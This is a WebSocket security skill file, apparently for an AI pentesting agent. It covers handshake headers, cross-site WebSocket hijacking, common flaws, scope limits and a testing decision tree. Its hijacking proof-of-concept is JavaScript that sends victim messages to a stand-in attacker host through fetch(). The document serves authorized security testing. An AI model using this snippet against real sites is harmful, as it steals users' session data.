---
name: websocket-security
description: >-
  WebSocket handshake, CSWSH, tooling (wsrepl, ws-harness, Burp), and common flaws. Use when apps use real-time channels, chat, notifications, or WS-backed APIs.
---

# SKILL: WebSocket Security

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: This skill covers WebSocket protocol basics, cross-site WebSocket hijacking (CSWSH), practical tooling bridges, and common vulnerability classes. Apply only in **authorized** tests; treat tokens and message content as sensitive. For REST/GraphQL companion testing, route to **`api-sec`** when present in the workspace.

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: when supplied HTTP evidence contains `101` and `Upgrade: websocket`, route the authentication and authorization model through `api-sec` before the Run. Burp and browser DevTools are not current runtime capabilities.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. EXTERNAL TOOLING BOUNDARY

The current Tool Registry has no WebSocket client, browser, proxy extension, package installer, arbitrary Python, or shell capability. `wsrepl`, `ws-harness`, sqlmap, and Burp extensions are external analyst references only. Analyze supplied handshake and frame captures with bounded file tools; otherwise record the missing WebSocket capability.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Compare supplied captures from two explicitly authorized accounts; the runtime cannot reconnect with another user's cookie jar.
4. **CSWSH** — Require supplied browser evidence and an Origin negative control; the runtime cannot load a local HTML page.
5. **Message semantics** — Analyze supplied JSON/text frames. Active WebSocket fuzzing is a capability gap.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---

## 6. RELATED ROUTING

- From **`api-sec`** — authentication, authorization, IDOR, and rate limiting often **mirror** HTTP APIs behind the same WebSocket routes.

**Note**: WebSocket often shares session and permission models with REST; use `api-sec` to align authentication and resource boundaries on the same backend.

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 7. CSWSH — STEP-BY-STEP EXPLOITATION
- 8. WEBSOCKET SMUGGLING
- 9. SOCKET.IO SPECIFIC VULNERABILITIES
- 10. WEBSOCKET MESSAGE INJECTION
- 11. BINARY WEBSOCKET MESSAGE MANIPULATION
